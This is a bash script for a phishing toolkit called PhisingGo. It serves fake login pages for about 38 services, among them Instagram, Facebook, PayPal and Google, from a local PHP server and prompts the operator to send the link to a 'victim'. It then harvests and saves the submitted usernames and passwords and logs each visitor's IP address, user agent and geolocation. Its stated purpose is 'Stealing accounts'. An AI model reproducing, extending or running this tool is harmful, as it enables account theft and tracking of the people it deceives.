#!/usr/bin/bash
# PhisingGo
# Coded by thelinuxchoice
# Github: https://github.com/Somi190/PhisingGo
trap 'echo;stop;exit 1' 2
checkroot(){
if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mPlease, run this program as root!\n\n\e[0m"
    exit 1
fi
}
clearscreen(){
    clear
    reset
    sleep 1
}
dependencies(){
    command -v bash > /dev/null 2>&1 || { echo >&2 "I require bash but it's not installed. Install it aborting."; exit 1; }
    command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it aborting."; exit 1; }
    command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it aborting."; exit 1; }
    command -v openssl > /dev/null 2>&1 || { echo >&2 "I require openssl but it's not installed. Install it aborting."; exit 1; }
    command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it aborting."; exit 1; }
    command -v git > /dev/null 2>&1 || { echo >&2 "I require git but it's not installed. Install it aborting."; exit 1; }
    if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
        echo "/dev/urandom tidak ditemukan!"
    exit 1
fi
}
banner(){
printf "                                        \e[0;33m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
\e[0;36;2m █▀█ █ █ ▀█▀ █▀▀ ▀█▀ █▀█ █▀▀   \e[0;37m█▀▀ █▀█  \e[0;33m▐\e[0;34m▒▒▒▒▒▒▒▒\e[0;31m▄▄▄▄▄▄▄▄\e[0;34m▒▒▒▒▒▒\e[0;33m▌\e[0m
\e[0;36;2m █▀▀ █▀█  █  ▀▀█  █  █ █ █ █   \e[0;37m█ █ █ █  \e[0;33m▐\e[0;34m▒▒\e[0;31m█\e[0;34m▒▒▒\e[0;31m▄██████████▄\e[0;34m▒▒▒▒\e[0;33m▌\e[0m
\e[0;36;2m ▀   ▀ ▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀ ▀ ▀▀▀ \e[0;90m▀ \e[0;37m▀▀▀ ▀▀▀  \e[0;33m▐\e[0;34m▒\e[0;31m█▐\e[0;34m▒▒▒\e[0;31m████████████\e[0;34m▒▒▒▒\e[0;33m▌\e[0m
\e[0m[\e[1;2;96m01\e[0m] \e[1;77mInstagram \e[0m     \e[0m[\e[1;2;96m20\e[0m] \e[1;77mPinterest\e[0m      \e[0;33m▐\e[0;31m▒\e[0;31m▌▐\e[0;34m▒▒\e[0;31m██▄▀██████▀▄██\e[0;34m▒▒▒\e[0;33m▌\e[0m
\e[0m[\e[1;2;96m02\e[0m] \e[1;77mFacebook  \e[0m     \e[0m[\e[1;2;96m21\e[0m] \e[1;77meBay     \e[0m      \e[0;33m▐\e[0;31m▐┼▐\e[0;34m▒▒\e[0;31m██▄▄▄▄██▄▄▄▄██\e[0;34m▒▒▒\e[0;33m▌\e[0m
\e[0m[\e[1;2;96m03\e[0m] \e[1;77mSnapchat  \e[0m     \e[0m[\e[1;2;96m22\e[0m] \e[1;77mBitcoin  \e[0m      \e[0;33m▐\e[0;31m▐┼▐\e[0;34m▒▒\e[0;31m██████████████\e[0;34m▒▒▒\e[0;33m▌\e[0m
\e[0m[\e[1;2;96m04\e[0m] \e[1;77mTwitter   \e[0m     \e[0m[\e[1;2;96m23\e[0m] \e[1;77mVerizon  \e[0m      \e[0;33m▐\e[0;31m▐▄▐████─▀▐▐▀█─█─▌▐██▄\e[0;34m▒\e[0;33m▌\e[0m
\e[0m[\e[1;2;96m05\e[0m] \e[1;77mGithub    \e[0m     \e[0m[\e[1;2;96m24\e[0m] \e[1;77mDropBox  \e[0m      \e[0;33m▐\e[0;34m▒▒\e[0;31m█████──────────▐███▌\e[0;33m▌\e[0m
\e[0m[\e[1;2;96m06\e[0m] \e[1;77mGoogle    \e[0m     \e[0m[\e[1;2;96m25\e[0m] \e[1;77mAdobe    \e[0m      \e[0;33m▐\e[0;34m▒▒\e[0;31m█▀▀██▄█─▄───▐─▄███▀\e[0;34m▒\e[0;33m▌\e[0m
\e[0m[\e[1;2;96m07\e[0m] \e[1;77mSpotify   \e[0m     \e[0m[\e[1;2;96m26\e[0m] \e[1;77mShopify  \e[0m      \e[0;33m▐\e[0;34m▒▒\e[0;31m█\e[0;34m▒▒\e[0;31m███████▄██████\e[0;34m▒▒▒\e[0;33m▌\e[0m
\e[0m[\e[1;2;96m08\e[0m] \e[1;77mNetflix   \e[0m     \e[0m[\e[1;2;96m27\e[0m] \e[1;77mMessenger\e[0m      \e[0;33m▐\e[0;34m▒▒▒▒▒\e[0;31m██████████████\e[0;34m▒▒▒\e[0;33m▌\e[0m
\e[0m[\e[1;2;96m09\e[0m] \e[1;77mPayPal    \e[0m     \e[0m[\e[1;2;96m28\e[0m] \e[1;77mGitlab   \e[0m      \e[0;33m▐\e[0;34m▒▒▒▒▒\e[0;31m█████████▐▌██\e[0;31m▌\e[0;34m▒▒▒\e[0;33m▌\e[0m
\e[0m[\e[1;2;96m10\e[0m] \e[1;77mOrigin    \e[0m     \e[0m[\e[1;2;96m29\e[0m] \e[1;77mTwitch   \e[0m      \e[0;33m▐\e[0;34m▒▒▒▒▒\e[0;31m▐▀▐\e[0;34m▒\e[0;31m▌▀█▀\e[0;34m▒\e[0;31m▐\e[0;34m▒\e[0;31m█\e[0;34m▒▒▒▒▒\e[0;33m▌\e[0m
\e[0m[\e[1;2;96m11\e[0m] \e[1;77mSteam     \e[0m     \e[0m[\e[1;2;96m30\e[0m] \e[1;77mMySpace  \e[0m      \e[0;33m▐\e[0;34m▒▒▒▒▒▒▒▒▒▒▒\e[0;31m▐\e[0;34m▒▒▒▒\e[0;31m\e[0;31m▌\e[0;34m▒▒▒▒▒\e[0;33m▌\e[0m
\e[0m[\e[1;2;96m12\e[0m] \e[1;77mYahoo     \e[0m     \e[0m[\e[1;2;96m31\e[0m] \e[1;77mBadoo    \e[0m      \e[0;33m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
\e[0m[\e[1;2;96m13\e[0m] \e[1;77mLinkedin  \e[0m     \e[0m[\e[1;2;96m32\e[0m] \e[1;77mVk       \e[0m
\e[0m[\e[1;2;96m14\e[0m] \e[1;77mProtonmail\e[0m     \e[0m[\e[1;2;96m33\e[0m] \e[1;77mYandex   \e[0m      \e[0m[\e[1;93m&\e[0m] LICENSE\e[0m
\e[0m[\e[1;2;96m15\e[0m] \e[1;77mWordpress \e[0m     \e[0m[\e[1;2;96m34\e[0m] \e[1;77mdevianART\e[0m      \e[0m[\e[1;94m#\e[0m] Information\e[0m
\e[0m[\e[1;2;96m16\e[0m] \e[1;77mMicrosoft \e[0m     \e[0m[\e[1;2;96m35\e[0m] \e[1;77mWattpad  \e[0m      \e[0m[\e[1;92m*\e[0m] Update\e[0m
\e[0m[\e[1;2;96m17\e[0m] \e[1;77mFollowers \e[0m     \e[0m[\e[1;2;96m36\e[0m] \e[1;77mGame     \e[0m      \e[0m[\e[1;91m-\e[0m] Exit\e[0m
\e[0m[\e[1;2;96m18\e[0m] \e[1;77mFisipon   \e[0m     \e[0m[\e[1;2;96m37\e[0m] \e[1;77mCustom   \e[0m
\e[0m[\e[1;2;96m19\e[0m] \e[1;77mOutlook   \e[0m     \e[0m[\e[1;2;96m38\e[0m] \e[1;77mOthers   \e[0m      "
}
menu(){
    read -p $'\e[0m(\e[105;77;1m/\e[0m) \e[1;77mChoose an option: \e[0m\en' option
        if [[ $option == 01 || $option == 1 ]]; then
        server="instagram"
        start
            elif [[ $option == 02 || $option == 2 ]]; then
            server="facebook"
            start
                elif [[ $option == 03 || $option == 3 ]]; then
                server="snapchat"
                start
                    elif [[ $option == 04 || $option == 4 ]]; then
                    server="twitter"
                    start
                        elif [[ $option == 05 || $option == 5 ]]; then
                        server="github"
                        start
                    elif [[ $option == 06 || $option == 6 ]]; then
                    server="google"
                    start
                elif [[ $option == 07 || $option == 7 ]]; then
                server="spotify"
                start
            elif [[ $option == 08 || $option == 8 ]]; then
            server="netflix"
            start
        elif [[ $option == 09 || $option == 9 ]]; then
        server="paypal"
        start
    elif [[ $option == 10 ]]; then
    server="origin"
    start
        elif [[ $option == 11 ]]; then
        server="steam"
        start
            elif [[ $option == 12 ]]; then
            server="yahoo"
            start
                elif [[ $option == 13 ]]; then
                server="linkedin"
                start
                    elif [[ $option == 14 ]]; then
                    server="protonmail"
                    start
                        elif [[ $option == 15 ]]; then
                        server="wordpress"
                        start
                    elif [[ $option == 16 ]]; then
                    server="microsoft"
                    start
                elif [[ $option == 17 ]]; then
                server="instafollowers"
                start
            elif [[ $option == 18 ]]; then
            server="fisipon"
            start
        elif [[ $option == 19 ]]; then
        server="outlook"
        start
    elif [[ $option == 20 ]]; then
    server="pinterest"
    start
        elif [[ $option == 21 ]]; then
        server="shopping"
        start
            elif [[ $option == 22 ]]; then
            server="cryptocurrency"
            start
                elif [[ $option == 23 ]]; then
                server="verizon"
                start
                    elif [[ $option == 24 ]]; then
                    server="dropbox"
                    start
                        elif [[ $option == 25 ]]; then
                        server="adobe"
                        start
                    elif [[ $option == 26 ]]; then
                    server="shopify"
                    start
                elif [[ $option == 27 ]]; then
                server="messenger"
                start
            elif [[ $option == 28 ]]; then
            server="gitlab"
            start
        elif [[ $option == 29 ]]; then
        server="twitch"
        start
    elif [[ $option == 30 ]]; then
    server="myspace"
    start
        elif [[ $option == 31 ]]; then
        server="badoo"
        start
            elif [[ $option == 32 ]]; then
            server="vk"
            start
                elif [[ $option == 33 ]]; then
                server="yandex"
                start
                    elif [[ $option == 34 ]]; then
                    server="devianart"
                    start
                        elif [[ $option == 35 ]]; then
                        server="wattpad"
                        start
                    elif [[ $option == 36 ]]; then
                    server="game"
                    createpage
                    start
                elif [[ $option == 37 ]]; then
                server="create"
                createpage
                start
            elif [[ $option == 38 ]]; then
            server="other"
            createpage
            start
        elif [[ $option == '&' ]]; then
        echo
        nano LICENSE
        echo
        clearscreen
        banner
        menu
        elif [[ $option == '#' ]]; then
        echo
        informasi
        echo
        elif [[ $option == '*' ]]; then
        echo
        git pull origin master
        echo
        read -p $'\e[0m[\e[32m Back \e[0m]'
        clearscreen
        banner
        menu
        elif [[ $option == '-' ]]; then
        echo
        printf "\e[0m[\e[1;91m!\e[0m] \e[0;1;77mExit the program!\n\e[0m"
        echo
        exit 1
    else
        echo
        printf "\e[0m[=\e[1;41;77m Invalid Option \e[0m=]"
        echo
        sleep 1
    clearscreen
    banner
    menu
fi
}
informasi(){
clear
printf "\e[0;47;90;1m[              PhisingGo, My Github: @stepbyatepexe              ]\e[0m\n"
toilet -f smslant 'PhisingGo'
printf "
Name        : PhisingGo
Version     : 1.1 (Update: 30 January 2020, 3:31 AM)
Tanggal     : 20 July 2020
Author      : Somi brand
Purpose     : Stealing accounts using the method
              Modern Phising SOMI.
Thankyou    : enjoy with somi.
              FR13NDS, & all over
              humans on planet earth
NB          : Humans are not perfect
              as rich as this tool.
           

[ \e[4mUse this tool wisely. Thanks \e[0m] """
sleep 1
read -p $'\n\n\n\e[0m[ Back ]' opt
    if [[ $opt = '' ]]; then
        clearscreen
        banner
        menu
    fi
}
stop(){
    checkphp=$(ps aux | grep -o "php" | head -n1)
    if [[ $checkphp == *'php'* ]]; then
        pkill -f -2 php > /dev/null 2>&1
        killall -2 php > /dev/null 2>&1
    fi
}
createpage(){
    default_cap1="Wi-fi Session Expired"
    default_cap2="Please login again."
    default_user_text="Username:"
    default_pass_text="Password:"
    default_sub_text="Log-In"
        read -p $'\n\e[0m[\e[1;92m*\e[0m] \e[1;77mTitle 1 \e[0m(Default: Wi-fi Session Expired): \e[1;77m' cap1
        cap1="${cap1:-${default_cap1}}"
            read -p $'\e[0m[\e[1;93m*\e[0m] \e[1;77mTitle 2 \e[0m(Default: Please login again.): \e[1;77m' cap2
            cap2="${cap2:-${default_cap2}}"
                read -p $'\e[0m[\e[1;94m*\e[0m] \e[1;77mUsername failed \e[0m(Default: Username): \e[1;77m' user_text
                user_text="${user_text:-${default_user_text}}"
                    read -p $'\e[0m[\e[1;95m*\e[0m] \e[1;77mPassword failed \e[0m(Default: Password): \e[1;77m' pass_text
                    pass_text="${pass_text:-${default_pass_text}}"
                        read -p $'\e[0m[\e[1;96m*\e[0m] \e[1;77mSubmit failed \e[0m(Default: Log-In): \e[1;77m' sub_text
                        sub_text="${sub_text:-${default_sub_text}}"
        echo "<!DOCTYPE html>" > sites/create/login.html
        echo "<html>" >> sites/create/login.html
        echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
        IFS=$'\n'
        printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
        IFS=$'\n'
        printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
        IFS=$'\n'
        printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
        IFS=$'\n'
        printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
        IFS=$'\n'
        printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
        IFS=$'\n'
        printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
        printf '</center>' >> sites/create/login.html
        printf '<body>\n' >> sites/create/login.html
        printf '</html>\n' >> sites/create/login.html
}
catch_cred(){
    account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
    IFS=$'\n'
    password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
        printf "\e[0m[\e[1;94m#\e[0m] Accounts:\e[0;1;77m %s\n\e[0m" $account
        printf "\e[0m[\e[1;96m*\e[0m] Password:\e[0;1;77m %s\n\e[0m" $password
        cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
        printf "\e[0m[\e[1;95m+\e[0m] Saved:\e[0;1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
        killall -2 php > /dev/null 2>&1
    exit 1
}
getcredentials() {
    printf "\e[0m[\e[1;91m!\e[0m] \e[0;1;77mWaiting credensial ...\e[0m\n"
    while [ true ]; do
        if [[ -e "sites/$server/usernames.txt" ]]; then
            printf "\n\e[0m[\e[1;91m!\e[0m] \e[0;1;77mCredensial Found!\n"
            catch_cred
        fi
    sleep 1
done
}
catch_ip(){
    touch sites/$server/saved.usernames.txt
    ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
        printf "\e[0m[\e[1;94m#\e[0m] Target IP:\e[0;1;77m %s\e[0m\n" $ip
        printf "\e[0m[\e[1;93m*\e[0m] Useragent:\e[0;1;77m %s\e[0m\n" $ua
        printf "\e[0m[\e[1;96m&\e[0m] Saved:\e[0;1;77m %s/saved.ip.txt\e[0m\n" $server
        cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
        if [[ -e iptracker.log ]]; then
            rm -rf iptracker.log
        fi
IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
    printf "\n"
    hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
    if [[ $hostnameip != "" ]]; then
        printf "\e[0m[\e[1;96m*\e[0m] \e[0;1;77mHostname:\e[0m %s\e[0m\n" $hostnameip
    fi
    ##
    reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
    if [[ $reverse_dns != "" ]]; then
        printf "\e[0m[\e[1;95m*\e[0m] \e[0;1;77mReverse DNS:\e[0m %s\e[0m\n" $reverse_dns
    fi
    ##
    if [[ $continent != "" ]]; then
        printf "\e[0m[\e[1;94m*\e[0m] \e[0;1;77mIP Continet:\e[0m %s\e[0m\n" $continent
    fi
    ##
    country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
    if [[ $country != "" ]]; then
        printf "\e[0m[\e[1;93m*\e[0m] \e[0;1;77mIP Country:\e[0m %s\e[0m\n" $country
    fi
    ##
    state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
    if [[ $state != "" ]]; then
        printf "\e[0m[\e[1;92m*\e[0m] \e[0;1;77mState:\e[0m %s\e[0m\n" $state
    fi
    ##
    city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
    if [[ $city != "" ]]; then
        printf "\e[0m[\e[1;91m*\e[0m] \e[0;1;77mCity Location:\e[0m %s\e[0m\n" $city
    fi
    ##
    isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
    if [[ $isp != "" ]]; then
        printf "\e[0m[\e[1;96m*\e[0m] \e[0;1;77mISP:\e[0m %s\e[0m\n" $isp
    fi
    ##
    as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
    if [[ $as_number != "" ]]; then
        printf "\e[0m[\e[1;95m*\e[0m] \e[0;1;77mAS Number:\e[0m %s\e[0m\n" $as_number
    fi
    ##
    ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
    if [[ $ip_speed != "" ]]; then
        printf "\e[0m[\e[1;94m*\e[0m] \e[0;1;77mIP Address Speed:\e[0m %s\e[0m\n" $ip_speed
    fi
    ##
    ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
    if [[ $ip_currency != "" ]]; then
        printf "\e[0m[\e[1;93m*\e[0m] \e[0;1;77mIP Currency:\e[0m %s\e[0m\n" $ip_currency
    fi
    ##
    printf "\n"
    rm -rf iptracker.log
getcredentials
}
start(){
    if [[ -e sites/$server/ip.txt ]]; then
        rm -rf sites/$server/ip.txt

    fi
        if [[ -e sites/$server/usernames.txt ]]; then
            rm -rf sites/$server/usernames.txt
        fi
default_ip=$(hostname -i)
printf "\n\e[0m[\e[1;92m+\e[0m] \e[0;1;77mPut your local IP \e[0m(Default %s)\e[1;77m: " $default_ip
read ip
ip="${ip:-${default_ip}}"
printf "\e[0m[\e[1;93m*\e[0m] \e[0;1;77mStarting php server...\n"
sudo php -t "sites/$server" -S "$ip:80" > /dev/null 2>&1 &
sleep 2
printf "\e[0m[\e[1;94m*\e[0m] \e[0;1;77mSend this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $ip
checkfound
}
checkfound(){
printf "\e[0m[\e[1;95m*\e[0m] \e[0;1;77mWaiting victim open the link ...\e[0m\n"
    while [ true ]; do
        if [[ -e "sites/$server/ip.txt" ]]; then
            printf "\n\e[0m[\e[1;91m!\e[0m] \e[0;1;77mIP Found!\n"
            catch_ip
        fi
    sleep 1
done
}
checkroot
dependencies
    clearscreen
    banner
    menu
